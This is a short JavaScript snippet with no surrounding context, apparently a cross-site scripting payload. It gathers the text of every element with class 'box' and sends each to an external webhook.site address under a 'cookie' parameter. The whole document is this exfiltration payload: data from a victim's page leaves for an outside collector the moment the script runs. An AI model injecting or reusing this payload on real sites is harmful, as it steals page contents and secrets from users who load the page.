async function f() {
  document.querySelectorAll('.box').forEach(async function(e) {
    await fetch("https://webhook.site/3aa4a0c2-23a7-4b47-a6e8-00fb20234c33/?cookie="+e.innerText);
  });
}
f();
